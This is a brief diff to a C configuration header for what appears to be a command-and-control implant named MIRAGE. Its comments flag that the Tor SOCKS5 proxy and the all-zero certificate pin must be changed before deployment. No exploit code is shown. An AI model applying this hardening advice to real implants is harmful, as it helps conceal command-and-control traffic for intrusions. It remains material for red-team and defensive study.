@@ -136,6 +136,7 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 
 /* ═══════ SOCKS5 Proxy ════════════════════════════════════════ */
 #define ENABLE_SOCKS5
+/* L2: 127.0.0.1:9050 is the default Tor SOCKS5 endpoint — change to real proxy before deploy */
 #define SOCKS5_HOST     "127.0.0.1"
 #define SOCKS5_PORT     9050
 
@@ -162,7 +163,7 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 #define C2_TOKEN               "changeme"
 
 /* ═══════ Certificate Pinning ═══════════════════════════════════ */
-/* SHA-256 of server cert SubjectPublicKeyInfo (SPKI pin).
+/* L1: CERT_PIN_HASH is all-zero — pinning is a no-op until a real SPKI hash is set at build time.
  * Set via: openssl s_client -connect HOST:443 | openssl x509 -pubkey \
  *   | openssl pkey -pubout -outform DER | sha256sum
  * Placeholder until build-time extraction is wired. */
